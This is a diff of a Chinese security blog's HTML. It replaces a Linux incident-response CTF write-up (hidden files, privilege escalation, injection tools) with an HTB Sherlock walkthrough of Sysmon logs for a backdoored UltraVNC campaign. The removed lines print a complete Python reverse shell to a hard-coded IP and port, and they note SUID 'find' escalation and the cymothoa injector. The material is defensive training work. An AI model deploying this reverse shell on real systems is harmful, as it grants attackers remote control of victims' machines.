@@ -19,30 +19,33 @@
   <meta name="author" content="butt3rf1y">
   <meta name="keywords" content="">
   
-    <meta name="description" content="linux 权限维持-隐藏">
+    <meta name="description" content="Level ：Very Easy">
 <meta property="og:type" content="article">
-<meta property="og:title" content="玄机-第三章">
-<meta property="og:url" content="http://example.com/2025/03/25/%E7%8E%84%E6%9C%BA-%E7%AC%AC%E4%B8%89%E7%AB%A0/index.html">
+<meta property="og:title" content="HTB-Unit42">
+<meta property="og:url" content="http://example.com/2025/03/26/HTB-Unit42/index.html">
 <meta property="og:site_name" content="(｡･ω･｡)Welcome~">
-<meta property="og:description" content="linux 权限维持-隐藏">
+<meta property="og:description" content="Level ：Very Easy">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/128843394083324c.png">
-<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/b699994f9e1585c6.png">
-<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/a8f53deedf44cf0c.png">
-<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/83c4c3b40a572248.png">
-<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/5d0a3afbf8b67511.png">
-<meta property="article:published_time" content="2025-03-25T14:51:22.000Z">
-<meta property="article:modified_time" content="2025-03-25T14:55:06.099Z">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/641ff42c61e7a890.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/270fc11326e69cee.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/e4958e0776ec3034.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/6fa3f830749adb4f.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/51ac9f49d6ea327b.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/e4852961e571c92f.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/1ed51d5e6606defb.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/b0f504f6aeb99583.png">
+<meta property="article:published_time" content="2025-03-26T11:56:31.000Z">
+<meta property="article:modified_time" content="2025-03-26T12:03:56.855Z">
 <meta property="article:author" content="butt3rf1y">
 <meta property="article:tag" content="应急响应">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://img.dkdun.cn/v1/2025/12/128843394083324c.png">
+<meta name="twitter:image" content="https://img.dkdun.cn/v1/2025/12/641ff42c61e7a890.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>玄机-第三章 - (｡･ω･｡)Welcome~</title>
+  <title>HTB-Unit42 - (｡･ω･｡)Welcome~</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -231,7 +234,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="玄机-第三章"></span>
+            <span id="subtitle" data-typed-text="HTB-Unit42"></span>
           
         </div>
 
@@ -242,8 +245,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-03-25 22:51" pubdate>
-          2025年3月25日 晚上
+        <time datetime="2025-03-26 19:56" pubdate>
+          2025年3月26日 晚上
         </time>
       </span>
     
@@ -254,7 +257,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          619 字
+          300 字
         
       </span>
     
@@ -265,7 +268,7 @@
         
         
         
-          6 分钟
+          3 分钟
         
       </span>
     
@@ -312,12 +315,12 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">玄机-第三章</h1>
+            <h1 id="seo-header">HTB-Unit42</h1>
             
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2025年3月25日 晚上
+                    本文最后更新于 2025年3月26日 晚上
                   
                 
               </p>
@@ -325,51 +328,45 @@
             
               <div class="markdown-body">
                 
-                <p>linux 权限维持-隐藏</p>
+                <p>Level ：Very Easy</p>
 <span id="more"></span>
 
-<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">ssh root@env.xj.edisec.net -p  密码  xjqxwcyc</span><br><span class="language-xml">1.黑客隐藏的隐藏的文件 完整路径md5</span><br><span class="language-xml">2.黑客隐藏的文件反弹shell的ip+端口 </span><span class="hljs-template-variable">&#123;ip:port&#125;</span><span class="language-xml"></span><br><span class="language-xml">3.黑客提权所用的命令 完整路径的md5 flag</span><span class="hljs-template-variable">&#123;md5&#125;</span><span class="language-xml"> </span><br><span class="language-xml">4.黑客尝试注入恶意代码的工具完整路径md5</span><br><span class="language-xml">5.使用命令运行 ./x.xx 执行该文件  将查询的 Exec****** 值 作为flag提交 flag</span><span class="hljs-template-tag">&#123;/<span class="hljs-name">xxx</span>/xxx/xxx&#125;</span><br></code></pre></td></tr></table></figure>
+<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>In this Sherlock, you will familiarize yourself with Sysmon logs and various useful EventIDs for identifying and analyzing malicious activities on a Windows system. Palo Alto’s Unit42 recently conducted research on an UltraVNC campaign, wherein attackers utilized a backdoored version of UltraVNC to maintain access to systems. This lab is inspired by that campaign and guides participants through the initial access stage of the campaign.</p>
+<h1 id="Task-1"><a href="#Task-1" class="headerlink" title="Task 1"></a>Task 1</h1><p>用 Windows 自带的时间查看器打开，筛选一下 ID 就知道了</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/641ff42c61e7a890.png"></p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">How many <span class="hljs-keyword">Event</span> logs are there <span class="hljs-keyword">with</span> <span class="hljs-keyword">Event</span> ID <span class="hljs-number">11</span>?<br>:<span class="hljs-number">56</span><br></code></pre></td></tr></table></figure>
 
-<h1 id="Q1"><a href="#Q1" class="headerlink" title="Q1"></a>Q1</h1><p>使用命令查找文件，发现在 <code>/tmp</code> 下还有一个隐藏的 <code>.temp</code> 文件夹</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&quot;.*&quot;</span><br></code></pre></td></tr></table></figure>
+<h1 id="Task-2"><a href="#Task-2" class="headerlink" title="Task 2"></a>Task 2</h1><p>筛选事件 ID 为 1 的日志，一个一个查看详细信息，可以发现下载了 <code>Preventivo24.02.14.exe.exe</code></p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/270fc11326e69cee.png"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Whenever a process <span class="hljs-keyword">is</span> created <span class="hljs-keyword">in</span> memory, an event <span class="hljs-keyword">with</span> Event ID <span class="hljs-number">1</span> <span class="hljs-keyword">is</span> recorded <span class="hljs-keyword">with</span> details such <span class="hljs-keyword">as</span> command <span class="hljs-type">line</span>, hashes, process <span class="hljs-type">path</span>, parent process <span class="hljs-type">path</span>, etc. This information <span class="hljs-keyword">is</span> very useful <span class="hljs-keyword">for</span> an analyst because it allows us <span class="hljs-keyword">to</span> see <span class="hljs-keyword">all</span> programs executed <span class="hljs-keyword">on</span> a <span class="hljs-keyword">system</span>, which means we can spot <span class="hljs-keyword">any</span> malicious processes being executed. What <span class="hljs-keyword">is</span> the malicious process that infected the victim<span class="hljs-string">&#x27;s system</span><br><span class="hljs-string">:C:\Users\CyberJunkie\Downloads\Preventivo24.02.14.exe.exe</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img.dkdun.cn/v1/2025/12/128843394083324c.png"></p>
-<p>进入找到了 <code>1.py</code> 文件</p>
-<p><img src="https://img.dkdun.cn/v1/2025/12/b699994f9e1585c6.png"></p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">109</span>ccb5768c70638e24fb46ee7957e37&#125;<br></code></pre></td></tr></table></figure>
+<h1 id="Task-3"><a href="#Task-3" class="headerlink" title="Task 3"></a>Task 3</h1><p>筛选 DNS 事件，ID 为 22，可用于查找系统发出的任何 DNS 查询</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/e4958e0776ec3034.png"></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">Which Cloud drive was used <span class="hljs-selector-tag">to</span> distribute the malware?<br><span class="hljs-selector-pseudo">:drop</span>box<br></code></pre></td></tr></table></figure>
 
-<h1 id="Q2"><a href="#Q2" class="headerlink" title="Q2"></a>Q2</h1><p>一个反弹 shell 的文件</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">import</span> socket,subprocess,os,sys, time<br><br>pidrg = os.fork()<br><span class="hljs-keyword">if</span> pidrg &gt; <span class="hljs-number">0</span>:<br>        sys.exit(<span class="hljs-number">0</span>)<br><br>os.chdir(<span class="hljs-string">&quot;/&quot;</span>)<br>os.setsid()<br>os.umask(<span class="hljs-number">0</span>)<br>drgpid = os.fork()<br><span class="hljs-keyword">if</span> drgpid &gt; <span class="hljs-number">0</span>:<br>        sys.exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">try</span>:<br>                sys.stdout.flush()<br>                sys.stderr.flush()<br>                fdreg = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/null&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)<br>                sys.stdout = fdreg<br>                sys.stderr = fdreg<br>                sdregs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>                sdregs.connect((<span class="hljs-string">&quot;114.114.114.121&quot;</span>,<span class="hljs-number">9999</span>))<br>                os.dup2(sdregs.fileno(),<span class="hljs-number">0</span>)<br>                os.dup2(sdregs.fileno(),<span class="hljs-number">1</span>)<br>                os.dup2(sdregs.fileno(),<span class="hljs-number">2</span>)<br>                p=subprocess.call([<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>])<br>                sdregs.close()<br>        <span class="hljs-keyword">except</span> Exception:<br>                <span class="hljs-keyword">pass</span><br>        time.sleep(<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure>
+<h1 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h1><p>筛选 ID 为 2 的事件，此事件 ID 记录系统上任何文件的任何文件创建时间变化。</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/6fa3f830749adb4f.png"></p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">For many <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">files</span> <span class="hljs-keyword">it</span> wrote <span class="hljs-built_in">to</span> disk, <span class="hljs-keyword">the</span> initial malicious <span class="hljs-built_in">file</span> used <span class="hljs-keyword">a</span> defense evasion technique called Time Stomping, where <span class="hljs-keyword">the</span> <span class="hljs-built_in">file</span> creation <span class="hljs-built_in">date</span> is changed <span class="hljs-built_in">to</span> make <span class="hljs-keyword">it</span> appear older <span class="hljs-keyword">and</span> blend <span class="hljs-keyword">in</span> <span class="hljs-keyword">with</span> other <span class="hljs-built_in">files</span>. What was <span class="hljs-keyword">the</span> timestamp changed <span class="hljs-built_in">to</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> PDF <span class="hljs-built_in">file</span>?<br>:<span class="hljs-number">2024</span><span class="hljs-number">-01</span><span class="hljs-number">-14</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">06</span><br></code></pre></td></tr></table></figure>
 
-<p>找到 IP 和端口：114.114.114.121:9999</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">114.114.114.121:9999</span>&#125;<br></code></pre></td></tr></table></figure>
+<h1 id="Task-5"><a href="#Task-5" class="headerlink" title="Task 5"></a>Task 5</h1><p>筛选 ID 为 11 的事件</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/51ac9f49d6ea327b.png"></p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">The malicious file dropped a few files on disk. Where was &quot;once.cmd&quot; created on disk? Please answer with the full path along with the filename.<br><span class="hljs-meta">: C:\Users\CyberJunkie\AppData\Roaming\Photo</span> and Fax Vn\Photo and vn 1.1.2\install\F97891C\WindowsVolume\Games\once.cmd <br></code></pre></td></tr></table></figure>
 
-<h1 id="Q3"><a href="#Q3" class="headerlink" title="Q3"></a>Q3</h1><p>一般关于提权的可以先查找跟 <code>suid</code> 有关的东西</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@xuanji:~# find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>/bin/mount<br>/bin/ping<br>/bin/ping6<br>/bin/su<br>/bin/umount<br>/usr/bin/chfn<br>/usr/bin/chsh<br>/usr/bin/find<br>/usr/bin/gpasswd<br>/usr/bin/newgrp<br>/usr/bin/passwd<br>/usr/bin/sudo<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/openssh/ssh-keysign<br></code></pre></td></tr></table></figure>
+<h1 id="Task-6"><a href="#Task-6" class="headerlink" title="Task 6"></a>Task 6</h1><p>筛选 DNS 事件，ID 为 22</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/e4852961e571c92f.png"></p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">The malicious <span class="hljs-built_in">file</span> attempted <span class="hljs-built_in">to</span> reach <span class="hljs-keyword">a</span> dummy domain, most likely <span class="hljs-built_in">to</span> check <span class="hljs-keyword">the</span> <span class="hljs-keyword">internet</span> connection status. What domain name did <span class="hljs-keyword">it</span> <span class="hljs-keyword">try</span> <span class="hljs-built_in">to</span> connect <span class="hljs-built_in">to</span>?<br>:www.example.com<br></code></pre></td></tr></table></figure>
 
-<p>可以发现过滤出来了一个 <code>find</code></p>
-<p><img src="https://img.dkdun.cn/v1/2025/12/a8f53deedf44cf0c.png"></p>
-<p>find 也可以提权：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/find/">find</a>，所以路径为： <code>/usr/bin/find</code></p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">7</span>fd5884f493f4aaf96abee286ee04120&#125;<br></code></pre></td></tr></table></figure>
+<h1 id="Task-7"><a href="#Task-7" class="headerlink" title="Task 7"></a>Task 7</h1><p><img src="https://img.dkdun.cn/v1/2025/12/1ed51d5e6606defb.png"></p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Which IP address did <span class="hljs-keyword">the</span> malicious <span class="hljs-built_in">process</span> <span class="hljs-keyword">try</span> <span class="hljs-built_in">to</span> reach out <span class="hljs-built_in">to</span>?<br>:<span class="hljs-number">93.184</span><span class="hljs-number">.216</span><span class="hljs-number">.34</span><br></code></pre></td></tr></table></figure>
 
-<h1 id="Q4"><a href="#Q4" class="headerlink" title="Q4"></a>Q4</h1><p>查找隐藏的文件夹</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -<span class="hljs-built_in">type</span> d -name <span class="hljs-string">&quot;.*&quot;</span> -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
+<h1 id="Task-8"><a href="#Task-8" class="headerlink" title="Task 8"></a>Task 8</h1><p>一条一条看，然后看到有关于 <code>UVncVirtualDisplay</code> 的路径</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/b0f504f6aeb99583.png"></p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">The malicious <span class="hljs-built_in">process</span> terminated itself <span class="hljs-keyword">after</span> infecting <span class="hljs-keyword">the</span> PC <span class="hljs-keyword">with</span> <span class="hljs-keyword">a</span> backdoored variant <span class="hljs-keyword">of</span> UltraVNC. When did <span class="hljs-keyword">the</span> <span class="hljs-built_in">process</span> terminate itself?<br>:<span class="hljs-number">2024</span><span class="hljs-number">-02</span><span class="hljs-number">-14</span> <span class="hljs-number">03</span>:<span class="hljs-number">41</span>:<span class="hljs-number">58</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img.dkdun.cn/v1/2025/12/83c4c3b40a572248.png"></p>
-<p>进入 <code>/opt/.cymothoa-1-beta</code>，发现了 <code>cymothoa</code></p>
-<p><img src="https://img.dkdun.cn/v1/2025/12/5d0a3afbf8b67511.png"></p>
-<p><code>cymothoa</code> 是一款隐秘的后门工具。它通过向目标主机活跃的进程注入恶意代码，从而获取和原进程相同的权限，工具最大的优点就是不创建新的进程，不容易被发现，所以尝试注入恶意代码的工具完整路径为：<code>/opt/.cymothoa-1-beta/cymothoa</code></p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">087</span>c267368ece4fcf422ff733b51aed9&#125;<br></code></pre></td></tr></table></figure>
+<h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><p>Sysmon 生成的每种事件类型的示例</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">事件 <span class="hljs-title class_">ID</span> <span class="hljs-number">1</span><span class="hljs-symbol">:</span>有关新创建进程的扩展信息<br>事件 <span class="hljs-title class_">ID</span> <span class="hljs-number">2</span><span class="hljs-symbol">:</span>记录更改文件创建时间事件<br>事件 <span class="hljs-title class_">ID</span> <span class="hljs-number">3</span><span class="hljs-symbol">:</span>网络连接事件记录计算机上的 <span class="hljs-title class_">TCP</span>/<span class="hljs-title class_">UDP</span> 连接<br>事件 <span class="hljs-title class_">ID</span> <span class="hljs-number">11</span><span class="hljs-symbol">:</span>当创建或覆盖文件时，会记录文件创建操作<br>事件 <span class="hljs-title class_">ID</span> <span class="hljs-number">22</span><span class="hljs-symbol">:DNSEvent</span>（<span class="hljs-title class_">DNS</span> 查询）<br></code></pre></td></tr></table></figure>
 
-<h1 id="Q5"><a href="#Q5" class="headerlink" title="Q5"></a>Q5</h1><h2 id="Method-1"><a href="#Method-1" class="headerlink" title="Method 1"></a>Method 1</h2><p>执行 <code>1.py</code> 文件，因为前面知道文件 <code>#!/usr/bin/python3</code>，用 python3 执行，根据 PID 查找</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@xuanji:/# python3 /tmp/.temp/libprocesshider/1.py<br>root@xuanji:/# ps -ef | grep <span class="hljs-string">&quot;1.py&quot;</span><br>root         428       1  0 14:25 ?        00:00:00 python3 /tmp/.temp/libprocesshider/1.py<br>root         430     405  0 14:25 pts/0    00:00:00 grep --color=auto 1.py<br>root@xuanji:/# ll /proc/428/exe<br>lrwxrwxrwx. 1 root root 0 Mar 25 14:25 /proc/428/exe -&gt; /usr/bin/python3.4*<br></code></pre></td></tr></table></figure>
-
-<p>所以 flag 为</p>
-<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-tag">&#123;/<span class="hljs-name">usr</span>/bin/python3.4&#125;</span><br></code></pre></td></tr></table></figure>
-
-<h2 id="Method-2"><a href="#Method-2" class="headerlink" title="Method 2"></a>Method 2</h2><p>还可以执行之查找 <code>python3</code> 的运行情况</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@xuanji:/# python3 /tmp/.temp/libprocesshider/1.py<br>root@xuanji:/# <span class="hljs-built_in">which</span> python3<br>/usr/bin/python3<br>root@xuanji:/# <span class="hljs-built_in">ls</span> -al /usr/bin/python3<br>lrwxrwxrwx. 1 root root 9 Mar 23  2014 /usr/bin/python3 -&gt; python3.4<br></code></pre></td></tr></table></figure>
-
+<p>具体事件 ID 详解：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon">Events</a></p>
 
                 
               </div>
@@ -393,7 +390,7 @@
   
     <span>></span>
     
-  <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/" class="category-chain-item">玄机</a>
+  <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/HTB/" class="category-chain-item">HTB</a>
   
   
 
@@ -422,8 +419,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>玄机-第三章</div>
-      <div>http://example.com/2025/03/25/玄机-第三章/</div>
+      <div>HTB-Unit42</div>
+      <div>http://example.com/2025/03/26/HTB-Unit42/</div>
     </div>
     <div class="license-meta">
       
@@ -435,7 +432,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年3月25日</div>
+          <div>2025年3月26日</div>
         </div>
       
       
@@ -467,18 +464,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/03/26/HTB-Unit42/" title="HTB-Unit42">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">HTB-Unit42</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/03/25/HTB-Meerkat/" title="HTB-Meerkat">
-                        <span class="hidden-mobile">HTB-Meerkat</span>
+                      <a href="/2025/03/25/%E7%8E%84%E6%9C%BA-%E7%AC%AC%E4%B8%89%E7%AB%A0/" title="玄机-第三章">
+                        <span class="hidden-mobile">玄机-第三章</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
